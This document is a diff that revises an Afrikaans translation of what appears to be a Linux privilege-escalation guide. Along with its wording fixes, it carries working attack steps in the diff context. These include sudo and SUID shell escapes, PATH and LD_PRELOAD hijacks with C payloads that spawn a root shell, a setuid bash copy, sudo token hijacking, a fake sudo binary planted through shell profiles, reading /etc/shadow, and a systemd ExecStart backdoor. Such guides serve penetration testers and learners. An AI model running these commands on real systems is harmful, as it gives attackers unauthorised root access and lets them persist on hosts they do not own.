-D-Bus werk op 'n **toelaat/weier model**, wat boodskappermissies (metode-oproepe, seinemissies, ens.) bestuur op grond van die kumulatiewe effek van ooreenstemmende beleidreëls. Hierdie beleide spesifiseer interaksies met die bus, wat moontlik voorregte-escalasie deur die uitbuiting van hierdie toestemmings toelaat.
+D-Bus werk op 'n **toelaat/weier-model**, wat boodskappermissies (metode-oproepe, seinemissies, ens.) bestuur op grond van die kumulatiewe effek van ooreenstemmende beleidreëls. Hierdie beleide spesifiseer interaksies met die bus en kan moontlik voorregte-escalasie toelaat deur die uitbuiting van hierdie toestemmings.
 
-'n Voorbeeld van so 'n beleid in `/etc/dbus-1/system.d/wpa_supplicant.conf` word verskaf, wat toestemmings vir die root-gebruiker om besit te hê, na, en boodskappe te ontvang van `fi.w1.wpa_supplicant1`.
+'n Voorbeeld van so 'n beleid in `/etc/dbus-1/system.d/wpa_supplicant.conf` word verskaf, wat toestemmings vir die root-gebruiker om besit te hê, na te stuur en boodskappe te ontvang van `fi.w1.wpa_supplicant1` beskryf.
 
 Beleide sonder 'n gespesifiseerde gebruiker of groep geld universeel, terwyl "standaard" konteksbeleide van toepassing is op almal wat nie deur ander spesifieke beleide gedek word nie.
 ```xml
@@ -606,7 +606,7 @@ Beleide sonder 'n gespesifiseerde gebruiker of groep geld universeel, terwyl "st
 
 ## **Netwerk**
 
-Dit is altyd interessant om die netwerk te ontleed en uit te vind waar die masjien geleë is.
+Dit is altyd interessant om die netwerk te ontleed en die posisie van die masjien uit te vind.
 
 ### Generiese ontleding
 ```bash
@@ -640,15 +640,15 @@ Bevestig altyd netwerkdienste wat op die masjien loop wat jy nie kon interaksie 
 ```
 ### Sniffing
 
-Kyk of jy verkeer kan afluister. As jy kan, kan jy moontlik sekere geloofsbriewe vasvang.
+Kyk of jy verkeer kan afluister. As jy dit kan doen, kan jy moontlik sekere geloofsbriewe vasvang.
 ```
 timeout 1 tcpdump
 ```
 ## Gebruikers
 
-### Generiese Opstel
+### Generiese Opname
 
-Kontroleer **wie** jy is, watter **bevoegdhede** jy het, watter **gebruikers** in die stelsels is, wie kan **aanmeld** en wie het **root-bevoegdhede:**
+Kyk **wie** jy is, watter **voorregte** jy het, watter **gebruikers** in die stelsels is, wie kan **aanmeld** en wie het **root-voorregte:**
 ```bash
 #Info about me
 id || (whoami && groups) 2>/dev/null
@@ -706,14 +706,14 @@ Indien jy **enige wagwoord** van die omgewing **ken, probeer om in te teken as e
 
 ### Su Brute
 
-Indien jy nie omgee om baie geraas te maak nie en `su` en `timeout` bineêre lêers op die rekenaar teenwoordig is, kan jy probeer om 'n gebruiker te krag met [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
+Indien jy nie omgee om baie geraas te maak nie en die `su` en `timeout` binêre lêers is teenwoordig op die rekenaar, kan jy probeer om 'n gebruiker te krag met [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
 [**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) met die `-a` parameter probeer ook om gebruikers te krag.
 
 ## Skryfbare PATH-misbruik
 
 ### $PATH
 
-Indien jy vind dat jy **binne 'n paar van die $PATH se lêers kan skryf**, kan jy bevoorregtinge eskaleer deur **'n agterdeur binne die skryfbare lêer** te skep met die naam van 'n bevel wat deur 'n ander gebruiker (idealiter root) uitgevoer gaan word en wat **nie gelaai word van 'n lêer wat voorafgaan** aan jou skryfbare lêer in $PATH nie.
+Indien jy vind dat jy kan **skryf binne 'n paar van die $PATH se lêers**, kan jy bevoorregtinge eskaleer deur **'n agterdeur te skep binne die skryfbare lêer** met die naam van 'n bevel wat uitgevoer gaan word deur 'n ander gebruiker (idealiter root) en wat **nie gelaai word van 'n lêer wat vooraf geleë is** aan jou skryfbare lêer in $PATH.
 
 ### SUDO en SUID
 
@@ -733,13 +733,13 @@ less>! <shell_comand>
 ```
 ### GEENWAGWOORD
 
-Sudo-konfigurasie mag 'n gebruiker toelaat om 'n bepaalde bevel uit te voer met 'n ander gebruiker se regte sonder om die wagwoord te weet.
+Sudo-konfigurasie mag 'n gebruiker toelaat om 'n sekere bevel uit te voer met 'n ander gebruiker se regte sonder om die wagwoord te weet.
 ```
 $ sudo -l
 User demo may run the following commands on crashlab:
 (root) NOPASSWD: /usr/bin/vim
 ```
-In hierdie voorbeeld kan die gebruiker `demo` `vim` as `root` hardloop, dit is nou maklik om 'n skaal te kry deur 'n ssh-sleutel by die root-gids te voeg of deur `sh` te roep.
+In hierdie voorbeeld kan die gebruiker `demo` `vim` as `root` hardloop, dit is nou triviaal om 'n skaal te kry deur 'n ssh-sleutel by die root-gids te voeg of deur `sh` te roep.
 ```
 sudo vim -c '!sh'
 ```
@@ -776,35 +776,35 @@ sudo less /var/log/something /etc/shadow #Red 2 files
 
 ### Sudo-opdrag/SUID-binêre sonder opdragpad
 
-As die **sudo-toestemming** gegee word aan 'n enkele opdrag **sonder om die pad te spesifiseer**: _hacker10 ALL= (root) less_ kan jy dit uitbuit deur die PAD-veranderlike te verander
+As die **sudo-toestemming** gegee word aan 'n enkele opdrag **sonder om die pad te spesifiseer**: _hacker10 ALLES= (root) minder_ kan jy dit uitbuit deur die PAD-veranderlike te verander
 ```bash
 export PATH=/tmp:$PATH
 #Put your backdoor in /tmp and name it "less"
 sudo less
 ```
-Hierdie tegniek kan ook gebruik word as 'n **suid** binêre lêer 'n ander opdrag **uitvoer sonder om die pad daarna te spesifiseer (kontroleer altyd met** _**strings**_ **die inhoud van 'n vreemde SUID-binêre lêer)**.
+Hierdie tegniek kan ook gebruik word as 'n **suid** binêre lêer 'n ander opdrag **uitvoer sonder om die pad daarna te spesifiseer (kontroleer altyd met** _**strings**_ **die inhoud van 'n vreemde SUID binêre lêer)**.
 
-[Voorbeeld van payloads om uit te voer.](payloads-to-execute.md)
+[Voorbeeld van vragte om uit te voer.](payloads-to-execute.md)
 
-### SUID-binêre lêer met opdragpad
+### SUID binêre lêer met opdragpad
 
-As die **suid** binêre lêer 'n ander opdrag **uitvoer deur die pad te spesifiseer**, dan kan jy probeer om 'n **funksie uit te voer** wat genoem word na die opdrag wat die suid-lêer aanroep.
+As die **suid** binêre lêer 'n ander opdrag **uitvoer deur die pad te spesifiseer**, dan kan jy probeer om 'n **funksie uit te voer** wat genoem word soos die opdrag wat die suid-lêer aanroep.
 
-Byvoorbeeld, as 'n suid-binêre lêer _**/usr/sbin/service apache2 start**_ aanroep, moet jy probeer om die funksie te skep en dit uit te voer:
+Byvoorbeeld, as 'n suid binêre lêer _**/usr/sbin/service apache2 start**_ aanroep, moet jy probeer om die funksie te skep en dit uit te voer:
 ```bash
 function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
 export -f /usr/sbin/service
 ```
 ### LD\_PRELOAD & **LD\_LIBRARY\_PATH**
 
-Die **LD\_PRELOAD**-omgewingsveranderlike word gebruik om een of meer gedeelde biblioteke (.so-lêers) te spesifiseer wat deur die lêer gelaai moet word voordat alle ander, insluitend die standaard C-bibliotheek (`libc.so`). Hierdie proses staan bekend as die vooraf laai van 'n biblioteek.
+Die **LD\_PRELOAD**-omgewingsveranderlike word gebruik om een of meer gedeelde biblioteke (.so-lêers) te spesifiseer wat deur die lader voor alle ander biblioteke, insluitend die standaard C-bibliotheek (`libc.so`), gelaai moet word. Hierdie proses staan bekend as die vooraf-lading van 'n biblioteek.
 
-Tog, om stelselsekerheid te handhaaf en te voorkom dat hierdie funksie uitgebuit word, veral met **suid/sgid** uitvoerbare lêers, dwing die stelsel sekere voorwaardes af:
+Tog, om stelselsekuriteit te handhaaf en te voorkom dat hierdie funksie uitgebuit word, veral met **suid/sgid** uitvoerbare lêers, dwing die stelsel sekere voorwaardes af:
 
-- Die lêer ignoreer **LD\_PRELOAD** vir uitvoerbare lêers waar die werklike gebruikers-ID (_ruid_) nie ooreenstem met die effektiewe gebruikers-ID (_euid_).
+- Die lader ignoreer **LD\_PRELOAD** vir uitvoerbare lêers waar die werklike gebruikers-ID (_ruid_) nie ooreenstem met die effektiewe gebruikers-ID (_euid_).
 - Vir uitvoerbare lêers met suid/sgid word slegs biblioteke in standaardpaaie wat ook suid/sgid is, voorafgelaai.
 
-Privilege-escalation kan plaasvind as jy die vermoë het om opdragte met `sudo` uit te voer en die uitset van `sudo -l` die verklaring **env\_keep+=LD\_PRELOAD** insluit. Hierdie konfigurasie laat toe dat die **LD\_PRELOAD**-omgewingsveranderlike volhou en herken word selfs wanneer opdragte met `sudo` uitgevoer word, wat moontlik kan lei tot die uitvoering van willekeurige kode met verhoogde regte.
+Privilege-escalation kan plaasvind as jy die vermoë het om opdragte met `sudo` uit te voer en die uitset van `sudo -l` die verklaring **env\_keep+=LD\_PRELOAD** insluit. Hierdie konfigurasie laat toe dat die **LD\_PRELOAD**-omgewingsveranderlike volhou en herken word selfs wanneer opdragte met `sudo` uitgevoer word, wat moontlik tot die uitvoering van willekeurige kode met verhoogde regte kan lei.
 ```
 Defaults        env_keep += LD_PRELOAD
 ```
@@ -821,7 +821,7 @@ setuid(0);
 system("/bin/bash");
 }
 ```
-Voer dit dan **saamstel** met behulp van:
+Voer dit dan **kompileer** met:
 ```bash
 cd /tmp
 gcc -fPIC -shared -o pe.so pe.c -nostartfiles
@@ -831,7 +831,7 @@ Uiteindelik, **privileges verhoog** hardloop
 sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
 ```
 {% hint style="danger" %}
-'n Soortgelyke privesc kan misbruik word as die aanvaller beheer oor die **LD\_LIBRARY\_PATH** omgewingsveranderlike omdat hy beheer oor die pad waar biblioteke gaan gesoek word.
+'n Soortgelyke privesc kan misbruik word as die aanvaller beheer oor die **LD\_LIBRARY\_PATH** omgewingsveranderlike omdat hy die pad beheer waar biblioteke gaan gesoek word.
 {% endhint %}
 ```c
 #include <stdio.h>
@@ -854,7 +854,7 @@ sudo LD_LIBRARY_PATH=/tmp <COMMAND>
 ```
 ### SUID-binêre lêer - .so inspuiting
 
-Wanneer 'n binêre lêer met **SUID**-permissies wat ongewoon lyk, dit raadsaam is om te verifieer of dit **.so** lêers behoorlik laai. Dit kan nagegaan word deur die volgende bevel uit te voer:
+Wanneer 'n binêre lêer met **SUID**-permissies wat ongewoon lyk, gevind word, is dit 'n goeie praktyk om te verifieer of dit **.so** lêers behoorlik laai. Dit kan nagegaan word deur die volgende bevel uit te voer:
 ```bash
 strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
 ```
@@ -871,13 +871,13 @@ void inject(){
 system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
 }
 ```
-Hierdie kode, eens saamgestel en uitgevoer, het as doel om voorregte te verhoog deur lêertoestemmings te manipuleer en 'n skaal met verhoogde voorregte uit te voer.
+Hierdie kode, eens saamgestel en uitgevoer, het as doel om voorregte te verhoog deur lêerregte te manipuleer en 'n skaal met verhoogde voorregte uit te voer.
 
 Stel die bogenoemde C-lêer saam in 'n gedeelde voorwerp (.so) lêer met:
 ```bash
 gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
 ```
-Uiteindelik, die hardloop van die geaffekteerde SUID-binêre lêer behoort die uitbuiting te aktiveer, wat moontlike sisteemkompromieë moontlik maak.
+Uiteindelik, die hardloop van die geaffekteerde SUID-binêre lêer behoort die uitbuiting te aktiveer, wat kan lei tot potensiële sisteemkompromittering.
 
 ## Gedeelde Voorwerp Kaping
 ```bash
@@ -889,7 +889,7 @@ something.so => /lib/x86_64-linux-gnu/something.so
 readelf -d payroll  | grep PATH
 0x000000000000001d (RUNPATH)            Library runpath: [/development]
 ```
-Nou dat ons 'n SUID-binêre lêer gevind het wat 'n biblioteek laai van 'n vouer waar ons kan skryf, laat ons die biblioteek in daardie vouer skep met die nodige naam:
+Nou dat ons 'n SUID-binêre lading gevind het wat 'n biblioteek laai van 'n vouer waarin ons kan skryf, laat ons die biblioteek in daardie vouer skep met die nodige naam:
 ```c
 //gcc src.c -fPIC -shared -o /development/libshared.so
 #include <stdio.h>
@@ -902,7 +902,7 @@ setresuid(0,0,0);
 system("/bin/bash -p");
 }
 ```
-Indien jy 'n fout soos dit ontvang
+Indien jy 'n fout soos dit kry
 ```shell-session
 ./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
 ```
@@ -910,7 +910,7 @@ Dit beteken dat die biblioteek wat jy gegenereer het 'n funksie genaamd `a_funct
 
 ### GTFOBins
 
-[**GTFOBins**](https://gtfobins.github.io) is 'n saamgestelde lys van Unix-binêre lêers wat deur 'n aanvaller uitgebuit kan word om plaaslike sekuriteitsbeperkings te omseil. [**GTFOArgs**](https://gtfoargs.github.io/) is dieselfde, maar vir gevalle waar jy **slegs argumente kan invoeg** in 'n opdrag.
+[**GTFOBins**](https://gtfobins.github.io) is 'n saamgestelde lys van Unix-binêre lêers wat deur 'n aanvaller uitgebuit kan word om plaaslike sekuriteitsbeperkings te omseil. [**GTFOArgs**](https://gtfoargs.github.io/) is dieselfde, maar vir gevalle waar jy **slegs argumente kan inspuit** in 'n opdrag.
 
 Die projek versamel legitieme funksies van Unix-binêre lêers wat misbruik kan word om uit beperkte skulpe te breek, voorregte te eskaleer of te handhaaf, lêers oor te dra, bind- en omgekeerde skulpe te skep, en ander ná-uitbuitingstake te fasiliteer.
 
@@ -925,11 +925,11 @@ Die projek versamel legitieme funksies van Unix-binêre lêers wat misbruik kan 
 
 ### FallOfSudo
 
-As jy `sudo -l` kan toegang, kan jy die instrument [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) gebruik om te kyk of dit enige sudo-reël kan uitbuit.
+As jy toegang het tot `sudo -l` kan jy die instrument [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) gebruik om te kyk of dit enige sudo-reël kan uitbuit.
 
-### Hergebruik van Sudo Tokens
+### Hergebruik van Sudo-Token
 
-In gevalle waar jy **sudo-toegang** het, maar nie die wagwoord nie, kan jy voorregte eskaleer deur **te wag vir 'n sudo-opdraguitvoering en dan die sessietoken te kaap**.
+In gevalle waar jy **sudo-toegang** het maar nie die wagwoord nie, kan jy voorregte eskaleer deur **te wag vir 'n sudo-opdraguitvoering en dan die sessietoken te kaap**.
 
 Vereistes vir die eskalering van voorregte:
 
@@ -960,7 +960,7 @@ sudo su
 ```
 ### /var/run/sudo/ts/\<Gebruikersnaam>
 
-Indien jy **skryfregte** in die folder het of op enige van die geskepte lêers binne die folder, kan jy die bineêre [**write\_sudo\_token**](https://github.com/nongiach/sudo\_inject/tree/master/extra\_tools) gebruik om **'n sudo-teken vir 'n gebruiker en PID te skep**.\
+Indien jy **skryfregte** in die gids het of op enige van die geskepte lêers binne die gids, kan jy die binêre [**write\_sudo\_token**](https://github.com/nongiach/sudo\_inject/tree/master/extra\_tools) gebruik om **'n sudo-teken vir 'n gebruiker en PID te skep**.\
 Byvoorbeeld, as jy die lêer _/var/run/sudo/ts/sampleuser_ kan oorskryf en jy het 'n skaal as daardie gebruiker met PID 1234, kan jy **sudo-voorregte verkry** sonder om die wagwoord te weet deur die volgende te doen:
 ```bash
 ./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
@@ -987,17 +987,17 @@ echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
 ```
 ### DOAS
 
-Daar is alternatiewe vir die `sudo` binêre lêer soos `doas` vir OpenBSD, onthou om sy konfigurasie by `/etc/doas.conf` te kontroleer.
+Daar is alternatiewe vir die `sudo` binêre lêer soos `doas` vir OpenBSD, onthou om sy konfigurasie by `/etc/doas.conf` te kontroleer
 ```
 permit nopass demo as root cmd vim
 ```
 ### Sudo Oorheersing
 
-As jy weet dat 'n **gebruiker gewoonlik met 'n masjien verbind en `sudo` gebruik** om voorregte te eskaleer en jy het 'n skaal binne daardie gebruiker konteks, kan jy **'n nuwe sudo uitvoerbare lêer skep** wat jou kode as root sal uitvoer en dan die gebruiker se bevel. Dan, **verander die $PATH** van die gebruiker konteks (byvoorbeeld deur die nuwe pad in .bash\_profile by te voeg) sodat wanneer die gebruiker sudo uitvoer, jou sudo uitvoerbare lêer uitgevoer word.
+Indien jy weet dat 'n **gebruiker gewoonlik met 'n masjien verbind en `sudo` gebruik** om voorregte te verhoog en jy het 'n skaal binne daardie gebruikerskonteks, kan jy **'n nuwe sudo uitvoerbare lêer skep** wat jou kode as 'n root uitvoer en dan die gebruiker se bevel. Dan, **verander die $PATH** van die gebruikerskonteks (byvoorbeeld deur die nuwe pad in .bash\_profile by te voeg) sodat wanneer die gebruiker sudo uitvoer, jou sudo uitvoerbare lêer uitgevoer word.
 
-Let daarop dat as die gebruiker 'n ander skaal gebruik (nie bash nie) sal jy ander lêers moet wysig om die nuwe pad by te voeg. Byvoorbeeld [sudo-piggyback](https://github.com/APTy/sudo-piggyback) wysig `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Jy kan 'n ander voorbeeld vind in [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire\_modules/bashdoor.py)
+Let daarop dat as die gebruiker 'n ander skaal gebruik (nie bash nie) jy ander lêers moet wysig om die nuwe pad by te voeg. Byvoorbeeld [sudo-piggyback](https://github.com/APTy/sudo-piggyback) wysig `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Jy kan 'n ander voorbeeld vind in [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire\_modules/bashdoor.py)
 
-Of voer iets soos die volgende uit:
+Of voer iets soos uit:
 ```bash
 cat >/tmp/sudo <<EOF
 #!/bin/bash
@@ -1018,10 +1018,10 @@ sudo ls
 
 Die lêer `/etc/ld.so.conf` dui aan **waar die gelaai konfigurasie lêers vandaan kom**. Tipies bevat hierdie lêer die volgende pad: `include /etc/ld.so.conf.d/*.conf`
 
-Dit beteken dat die konfigurasie lêers vanaf `/etc/ld.so.conf.d/*.conf` gelees sal word. Hierdie konfigurasie lêers **verwys na ander vouers** waar **biblioteke** gesoek gaan word. Byvoorbeeld, die inhoud van `/etc/ld.so.conf.d/libc.conf` is `/usr/local/lib`. **Dit beteken dat die stelsel vir biblioteke binne `/usr/local/lib` sal soek**.
+Dit beteken dat die konfigurasie lêers vanaf `/etc/ld.so.conf.d/*.conf` gelees sal word. Hierdie konfigurasie lêers **verwys na ander folders** waar **biblioteke** gesoek gaan word. Byvoorbeeld, die inhoud van `/etc/ld.so.conf.d/libc.conf` is `/usr/local/lib`. **Dit beteken dat die stelsel vir biblioteke binne `/usr/local/lib` sal soek**.
 
-Indien **'n gebruiker om enige rede skryfregte het** op enige van die aangeduide paaie: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, enige lêer binne `/etc/ld.so.conf.d/` of enige vouer binne die konfigurasie lêer binne `/etc/ld.so.conf.d/*.conf` mag hy in staat wees om voorregte te eskaleer.\
-Neem 'n kyk na **hoe om hierdie wanopset uit te buit** op die volgende bladsy:
+Indien **'n gebruiker om enige rede skryfregte het** op enige van die aangeduide paaie: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, enige lêer binne `/etc/ld.so.conf.d/` of enige folder binne die konfigurasie lêer binne `/etc/ld.so.conf.d/*.conf` mag hy in staat wees om voorregte te eskaleer.\
+Neem 'n kyk na **hoe om hierdie wanopset te misbruik** op die volgende bladsy:
 
 {% content-ref url="ld.so.conf-example.md" %}
 [ld.so.conf-example.md](ld.so.conf-example.md)
@@ -1072,7 +1072,7 @@ Lees die volgende bladsy om **meer te leer oor bevoegdhede en hoe om dit te misb
 ## Gidsbevoegdhede
 
 In 'n gids dui die **bit vir "uitvoer"** aan dat die betrokke gebruiker in die gids kan "**cd**".\
-Die **"lees"** bit dui aan dat die gebruiker die **lêerlys** kan **sien**, en die **"skryf"** bit dui aan dat die gebruiker **lêers** kan **verwyder** en **nuwe** **lêers** kan **skep**.
+Die **"lees"** bit dui aan dat die gebruiker die **lêerlys** kan **sien**, en die **"skryf"** bit dui aan dat die gebruiker **lêers** kan **verwyder** en **nuwe lêers** kan **skep**.
 
 ## ACL's
 
@@ -1091,11 +1091,11 @@ getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
 ```
 ## Maak skul sesies oop
 
-In **ou weergawes** kan jy dalk 'n paar **skul** sessies van 'n ander gebruiker (**root**) **kap**.\
-In **nuutste weergawes** sal jy slegs in staat wees om aan **skerm sessies** van **jou eie gebruiker** te **koppel**. Nietemin, jy kan **interessante inligting binne die sessie** vind.
+In **ou weergawes** kan jy dalk 'n paar **skul**-sesies van 'n ander gebruiker (**root**) **kap**.\
+In **nuutste weergawes** sal jy slegs in staat wees om aan **skerm-sessies** van **jou eie gebruiker** te **koppel**. Nietemin, jy kan **interessante inligting binne die sessie** vind.
 
-### skerm sessies kap
-**Lys skerm sessies**
+### Skerm-sessies kap
+**Lys skerm-sessies**
 ```bash
 screen -ls
 screen -ls <username>/ # Show another user' screen sessions
@@ -1108,11 +1108,11 @@ screen -dr <session> #The -d is to detach whoever is attached to it
 screen -dr 3350.foo #In the example of the image
 screen -x [user]/[session id]
 ```
-## tmux sessies kaping
+## tmux-sessies kaping
 
-Dit was 'n probleem met **ou tmux weergawes**. Ek was nie in staat om 'n tmux (v2.1) sessie wat deur root geskep is, te kaap as 'n nie-bevoorregte gebruiker.
+Dit was 'n probleem met **ou tmux-weergawes**. Ek kon nie 'n tmux (v2.1) sessie wat deur root geskep is, kaap as 'n nie-bevoorregte gebruiker nie.
 
-**Lys tmux sessies**
+**Lys tmux-sessies**
 ```bash
 tmux ls
 ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
@@ -1120,7 +1120,7 @@ tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session i
 ```
 ![](<../../.gitbook/assets/image (837).png>)
 
-**Heg aan 'n sessie**
+**Heg tot 'n sessie**
 ```bash
 tmux attach -t myname #If you write something in this session it will appears in the other opened one
 tmux attach -d -t myname #First detach the session from the other console and then access it yourself
@@ -1137,26 +1137,26 @@ Kyk na **Valentine-boks van HTB** vir 'n voorbeeld.
 ### Debian OpenSSL Voorspelbare PRNG - CVE-2008-0166
 
 Alle SSL- en SSH-sleutels wat gegenereer is op Debian-gebaseerde stelsels (Ubuntu, Kubuntu, ens.) tussen September 2006 en 13 Mei 2008 kan deur hierdie fout geraak word.\
-Hierdie fout word veroorsaak wanneer 'n nuwe ssh-sleutel in daardie OS geskep word, aangesien **slegs 32,768 variasies moontlik was**. Dit beteken dat al die moontlikhede bereken kan word en **met die ssh openbare sleutel kan jy soek na die ooreenstemmende privaatsleutel**. Jy kan die berekende moontlikhede hier vind: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)
+Hierdie fout word veroorsaak wanneer 'n nuwe ssh-sleutel in daardie OS geskep word, aangesien **slegs 32,768 variasies moontlik was**. Dit beteken dat al die moontlikhede bereken kan word en **deur die ssh openbare sleutel te hê, kan jy soek na die ooreenstemmende privaatsleutel**. Jy kan die berekende moontlikhede hier vind: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)
 
 ### SSH Interessante konfigurasiewaardes
 
-* **PasswordAuthentication:** Specifiseer of wagwoordverifikasie toegelaat is. Die verstek is `nee`.
-* **PubkeyAuthentication:** Specifiseer of openbare sleutelverifikasie toegelaat is. Die verstek is `ja`.
-* **PermitEmptyPasswords**: Wanneer wagwoordverifikasie toegelaat is, spesifiseer dit of die bediener toegang tot rekeninge met leë wagwoorde toelaat. Die verstek is `nee`.
+* **PasswordAuthentication:** Specifiseer of wagwoordverifikasie toegelaat word. Die verstek is `no`.
+* **PubkeyAuthentication:** Specifiseer of openbare sleutelverifikasie toegelaat word. Die verstek is `yes`.
+* **PermitEmptyPasswords**: Wanneer wagwoordverifikasie toegelaat word, spesifiseer dit of die bediener toegang tot rekeninge met leë wagwoordsnare toelaat. Die verstek is `no`.
 
 ### PermitRootLogin
 
-Spesifiseer of root kan inlog met ssh, verstek is `nee`. Moontlike waardes:
+Spesifiseer of root kan inlog met ssh, verstek is `no`. Moontlike waardes:
 
-* `ja`: root kan inlog met wagwoord en privaatsleutel
-* `sonder-wagwoord` of `verbied-wagwoord`: root kan slegs inlog met 'n privaatsleutel
-* `gedwing-opdragte-slegs`: Root kan slegs inlog met 'n privaatsleutel en as die opdragte-opsies gespesifiseer is
-* `nee`: nee
+* `yes`: root kan inlog met wagwoord en privaatsleutel
+* `without-password` of `prohibit-password`: root kan slegs inlog met 'n privaatsleutel
+* `forced-commands-only`: Root kan slegs inlog met 'n privaatsleutel en as die opdragopsies gespesifiseer is
+* `no` : no
 
 ### AuthorizedKeysFile
 
-Spesifiseer lêers wat die openbare sleutels bevat wat gebruik kan word vir gebruikersverifikasie. Dit kan tokens soos `%h` bevat, wat deur die tuisgids vervang sal word. **Jy kan absolute paaie aandui** (beginnend met `/`) of **relatiewe paaie van die gebruiker se tuisgids**. Byvoorbeeld:
+Spesifiseer lêers wat die openbare sleutels bevat wat gebruik kan word vir gebruikersverifikasie. Dit kan tokens soos `%h` bevat, wat deur die tuisgids vervang sal word. **Jy kan absolute paaie aandui** (beginnend met `/`) of **relatiewe paaie vanaf die gebruiker se tuisgids**. Byvoorbeeld:
 ```bash
 AuthorizedKeysFile    .ssh/authorized_keys access
 ```
@@ -1164,17 +1164,17 @@ Daardie konfigurasie sal aandui dat as jy probeer om in te teken met die **priva
 
 ### ForwardAgent/AllowAgentForwarding
 
-SSH-agent deurstuur maak dit vir jou moontlik om **jou plaaslike SSH-sleutels te gebruik in plaas daarvan om sleutels** (sonder wagwoorde!) op jou bediener te laat lê. So, sal jy in staat wees om **te spring** via ssh **na 'n gasheer** en van daar af **te spring na 'n ander** gasheer **deur** die **sleutel** wat geleë is in jou **oorspronklike gasheer**.
+SSH-agent deurstuur maak dit vir jou moontlik om **jou plaaslike SSH-sleutels te gebruik in plaas daarvan om sleutels** (sonder wagwoorde!) op jou bediener te laat lê. So, sal jy in staat wees om **te spring** via ssh **na 'n gasheer** en van daar af **te spring na 'n ander** gasheer **deur** die **sleutel** geleë in jou **oorspronklike gasheer** te gebruik.
 
-Jy moet hierdie opsie instel in `$HOME/.ssh.config` soos hierdie:
+Jy moet hierdie opsie in `$HOME/.ssh.config` soos hierdie instel:
 ```
 Host example.com
 ForwardAgent yes
 ```
-Merk op dat as `Host` `*` is elke keer as die gebruiker na 'n ander masjien spring, daardie gasheer sal in staat wees om die sleutels te benader (wat 'n sekuriteitsprobleem is).
+Let daarop dat as `Host` `*` is elke keer as die gebruiker na 'n ander masjien spring, sal daardie gasheer in staat wees om die sleutels te benader (wat 'n veiligheidsprobleem is).
 
-Die lêer `/etc/ssh_config` kan **oorheers** hierdie **opsies** en hierdie konfigurasie toelaat of weier.\
-Die lêer `/etc/sshd_config` kan **toelaat** of **weier** ssh-agent deurstuur met die sleutelwoord `AllowAgentForwarding` (verstek is toelaat).
+Die lêer `/etc/ssh_config` kan hierdie **opsies** oorskryf en hierdie konfigurasie toelaat of weier.\
+Die lêer `/etc/sshd_config` kan ssh-agent deurstuur toelaat of weier met die sleutelwoord `AllowAgentForwarding` (verstek is toelaat).
 
 As jy vind dat Forward Agent gekonfigureer is in 'n omgewing, lees die volgende bladsy aangesien **jy dit kan misbruik om voorregte te eskaleer**:
 
@@ -1190,9 +1190,11 @@ Die lêer `/etc/profile` en die lêers onder `/etc/profile.d/` is **skripte wat 
 ```bash
 ls -l /etc/profile /etc/profile.d/
 ```
+Indien enige vreemde profielinskrywing gevind word, moet jy dit vir **sensitiewe besonderhede** ondersoek.
+
 ### Passwd/Shadow-lêers
 
-Afhanklik van die OS kan die `/etc/passwd` en `/etc/shadow` lêers dalk 'n ander naam gebruik of daar kan 'n rugsteun wees. Daarom word dit aanbeveel om **hulle almal te vind** en **te kyk of jy hulle kan lees** om te sien **of daar hasse** binne die lêers is:
+Afhanklik van die bedryfstelsel kan die `/etc/passwd` en `/etc/shadow` lêers 'n ander naam gebruik of daar kan 'n rugsteun wees. Daarom word dit aanbeveel om **hulle almal te vind** en **te kyk of jy hulle kan lees** om te sien **of daar hasse** binne die lêers is:
 ```bash
 #Passwd equivalent files
 cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
@@ -1227,22 +1229,20 @@ su - dummy
 ```
 **Let op:** Op BSD-platforms is `/etc/passwd` geleë by `/etc/pwd.db` en `/etc/master.passwd`, ook is die `/etc/shadow` hernoem na `/etc/spwd.db`.
 
-Jy moet nagaan of jy **kan skryf in sekere sensitiewe lêers**. Byvoorbeeld, kan jy skryf na 'n sekere **dienskonfigurasie-lêer**?
+Jy moet nagaan of jy **kan skryf na sekere sensitiewe lêers**. Byvoorbeeld, kan jy skryf na 'n sekere **dienskonfigurasie-lêer**?
 ```bash
 find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
 for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
 ```
-Byvoorbeeld, as die masjien 'n **tomcat**-bediener hardloop en jy kan **die Tomcat-dienskonfigurasie-lêer binne /etc/systemd/ wysig**, dan kan jy die lyne wysig:
+Byvoorbeeld, as die masjien 'n **tomcat**-bediener hardloop en jy kan die Tomcat-dienskonfigurasie-lêer binne /etc/systemd/ **verander**, dan kan jy die reëls verander:
 ```
 ExecStart=/path/to/backdoor
 User=root
 Group=root
 ```
-Jou agterdeur sal die volgende keer uitgevoer word wanneer tomcat begin word.
-
 ### Kontroleer Lêers
 
